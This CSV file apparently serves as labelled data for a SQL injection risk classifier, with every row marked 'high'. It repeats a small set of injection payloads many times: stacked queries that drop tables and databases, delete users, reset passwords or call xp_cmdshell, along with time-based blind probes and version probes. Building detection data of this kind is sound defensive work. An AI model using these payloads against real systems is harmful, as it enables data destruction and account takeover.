query,risk
'; INSERT INTO logs VALUES('hack') --,high
'; UPDATE users SET pass='hack' --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
' OR @@version,high
' OR @@version,high
'; UPDATE users SET pass='hack' --,high
'; ALTER TABLE users ADD col --,high
'; WAITFOR DELAY '0:0:5' --,high
'; DROP PROCEDURE admin_login --,high
' OR 1=1; DROP TABLE users --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DROP TABLE temp,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; EXEC master..xp_cmdshell 'ping' --,high
'; EXEC master..xp_cmdshell 'ping' --,high
'; UPDATE users SET pass='hack' --,high
"'; EXEC sp_configure 'options', 1 --",high
' OR 1=1; DROP TABLE users --,high
'; UPDATE users SET pass='hack' --,high
' OR 1=1; DROP TABLE users --,high
'; UPDATE users SET pass='hack' --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DROP DATABASE temp --,high
' OR @@version,high
'; DROP TABLE temp,high
' OR @@version,high
' OR @@version,high
'; UPDATE users SET pass='hack' --,high
'; DROP DATABASE temp --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; WAITFOR DELAY '0:0:5' --,high
'; EXEC master..xp_cmdshell 'ping' --,high
' OR @@version,high
'; DROP PROCEDURE admin_login --,high
' UNION SELECT @@version --,high
'; DROP TABLE temp --,high
'; DROP TABLE temp,high
' OR 1=1; DROP TABLE users --,high
'; DROP DATABASE temp --,high
'; WAITFOR DELAY '0:0:5' --,high
'; UPDATE users SET pass='hack' --,high
'; UPDATE users SET pass='hack' --,high
'; DROP TABLE temp,high
'; INSERT INTO logs VALUES('hack') --,high
'; WAITFOR DELAY '0:0:5' --,high
' OR @@version,high
'; DROP TABLE temp,high
'; INSERT INTO logs VALUES('hack') --,high
' OR 1=1; DROP TABLE users --,high
'; DROP TABLE temp --,high
'; DROP TABLE temp,high
'; DELETE FROM users --,high
'; INSERT INTO logs VALUES('hack') --,high
'; UPDATE users SET pass='hack' --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DROP PROCEDURE admin_login --,high
'; DROP PROCEDURE admin_login --,high
'; ALTER TABLE users ADD col --,high
'; DELETE FROM users --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DELETE FROM users --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DROP PROCEDURE admin_login --,high
"'; EXEC sp_configure 'options', 1 --",high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP DATABASE temp --,high
'; UPDATE users SET pass='hack' --,high
'; DROP TABLE temp --,high
'; DROP PROCEDURE admin_login --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DROP DATABASE temp --,high
'; SELECT SLEEP(5) --,high
' OR 1=1; DROP TABLE users --,high
'; ALTER TABLE users ADD col --,high
'; SELECT SLEEP(5) --,high
'; SELECT PG_SLEEP(5) --,high
'; DROP PROCEDURE admin_login --,high
'; WAITFOR DELAY '0:0:5' --,high
'; WAITFOR DELAY '0:0:5' --,high
'; SELECT SLEEP(5) --,high
'; DROP TABLE temp --,high
'; SELECT SLEEP(5) --,high
'; SELECT PG_SLEEP(5) --,high
'; ALTER TABLE users ADD col --,high
' OR 1=1; DROP TABLE users --,high
'; WAITFOR DELAY '0:0:5' --,high
' OR 1=1; DROP TABLE users --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP DATABASE temp --,high
'; UPDATE users SET pass='hack' --,high
'; SELECT SLEEP(5) --,high
' OR @@version,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
' OR @@version,high
'; SELECT SLEEP(5) --,high
'; DROP TABLE temp,high
'; DROP TABLE temp,high
'; DROP DATABASE temp --,high
"'; EXEC sp_configure 'options', 1 --",high
'; SELECT SLEEP(5) --,high
' OR @@version,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP PROCEDURE admin_login --,high
"'; EXEC sp_configure 'options', 1 --",high
' OR 1=1; DROP TABLE users --,high
'; SELECT PG_SLEEP(5) --,high
'; DROP PROCEDURE admin_login --,high
'; DROP TABLE temp,high
'; DELETE FROM users --,high
'; DROP DATABASE temp --,high
'; DROP PROCEDURE admin_login --,high
'; DELETE FROM users --,high
'; DROP TABLE temp --,high
'; DROP TABLE temp --,high
'; DROP TABLE temp,high
'; DROP DATABASE temp --,high
'; DROP TABLE temp --,high
'; DROP TABLE temp --,high
'; WAITFOR DELAY '0:0:5' --,high
"'; EXEC sp_configure 'options', 1 --",high
'; INSERT INTO logs VALUES('hack') --,high
'; DELETE FROM users --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP DATABASE temp --,high
' OR 1=1; DROP TABLE users --,high
'; UPDATE users SET pass='hack' --,high
'; UPDATE users SET pass='hack' --,high
' OR @@version,high
'; WAITFOR DELAY '0:0:5' --,high
"'; EXEC sp_configure 'options', 1 --",high
' UNION SELECT @@version --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
' OR @@version,high
' OR 1=1; DROP TABLE users --,high
'; DROP PROCEDURE admin_login --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DROP TABLE temp --,high
"'; EXEC sp_configure 'options', 1 --",high
'; INSERT INTO logs VALUES('hack') --,high
'; UPDATE users SET pass='hack' --,high
' OR 1=1; DROP TABLE users --,high
'; DROP DATABASE temp --,high
' UNION SELECT @@version --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
' OR @@version,high
'; DROP TABLE temp,high
' OR @@version,high
'; DROP TABLE temp --,high
'; EXEC master..xp_cmdshell 'ping' --,high
'; ALTER TABLE users ADD col --,high
'; DELETE FROM users --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; WAITFOR DELAY '0:0:5' --,high
' OR 1=1; DROP TABLE users --,high
'; SELECT SLEEP(5) --,high
'; WAITFOR DELAY '0:0:5' --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP TABLE temp --,high
'; INSERT INTO logs VALUES('hack') --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP PROCEDURE admin_login --,high
'; UPDATE users SET pass='hack' --,high
'; DROP DATABASE temp --,high
'; ALTER TABLE users ADD col --,high
'; DROP TABLE temp,high
'; DROP DATABASE temp --,high
'; DROP TABLE temp,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DROP PROCEDURE admin_login --,high
"'; EXEC sp_configure 'options', 1 --",high
'; ALTER TABLE users ADD col --,high
' OR 1=1; DROP TABLE users --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP TABLE temp --,high
'; DROP DATABASE temp --,high
'; UPDATE users SET pass='hack' --,high
' OR 1=1; DROP TABLE users --,high
' OR @@version,high
'; ALTER TABLE users ADD col --,high
'; ALTER TABLE users ADD col --,high
' OR 1=1; DROP TABLE users --,high
'; EXEC master..xp_cmdshell 'ping' --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
' OR 1=1; DROP TABLE users --,high
'; ALTER TABLE users ADD col --,high
'; WAITFOR DELAY '0:0:5' --,high
'; DROP PROCEDURE admin_login --,high
' OR @@version,high
'; DROP PROCEDURE admin_login --,high
'; DROP DATABASE temp --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DROP PROCEDURE admin_login --,high
' OR 1=1; DROP TABLE users --,high
'; DROP PROCEDURE admin_login --,high
'; ALTER TABLE users ADD col --,high
' OR @@version,high
'; ALTER TABLE users ADD col --,high
'; INSERT INTO logs VALUES('hack') --,high
'; ALTER TABLE users ADD col --,high
'; SELECT SLEEP(5) --,high
'; WAITFOR DELAY '0:0:5' --,high
' OR 1=1; DROP TABLE users --,high
' OR 1=1; DROP TABLE users --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; WAITFOR DELAY '0:0:5' --,high
'; DROP TABLE temp,high
'; DELETE FROM users --,high
' OR 1=1; DROP TABLE users --,high
'; DROP TABLE temp,high
"'; EXEC sp_configure 'options', 1 --",high
'; WAITFOR DELAY '0:0:5' --,high
'; WAITFOR DELAY '0:0:5' --,high
'; SELECT SLEEP(5) --,high
'; SELECT SLEEP(5) --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DROP TABLE temp,high
'; ALTER TABLE users ADD col --,high
' OR 1=1; DROP TABLE users --,high
'; DROP PROCEDURE admin_login --,high
'; INSERT INTO logs VALUES('hack') --,high
'; INSERT INTO logs VALUES('hack') --,high
'; WAITFOR DELAY '0:0:5' --,high
'; DROP PROCEDURE admin_login --,high
'; UPDATE users SET pass='hack' --,high
'; DROP DATABASE temp --,high
'; DELETE FROM users --,high
"'; EXEC sp_configure 'options', 1 --",high
'; ALTER TABLE users ADD col --,high
' OR 1=1; DROP TABLE users --,high
' OR @@version,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DROP TABLE temp,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; ALTER TABLE users ADD col --,high
'; UPDATE users SET pass='hack' --,high
'; DROP TABLE temp,high
'; DROP TABLE temp,high
'; SELECT SLEEP(5) --,high
'; DROP PROCEDURE admin_login --,high
'; DROP TABLE temp,high
'; UPDATE users SET pass='hack' --,high
' OR @@version,high
'; DROP DATABASE temp --,high
'; ALTER TABLE users ADD col --,high
' OR @@version,high
'; SELECT SLEEP(5) --,high
'; ALTER TABLE users ADD col --,high
'; DROP TABLE temp --,high
'; DROP PROCEDURE admin_login --,high
'; UPDATE users SET pass='hack' --,high
' OR @@version,high
"'; EXEC sp_configure 'options', 1 --",high
'; ALTER TABLE users ADD col --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; DELETE FROM users --,high
'; DROP PROCEDURE admin_login --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP TABLE temp,high
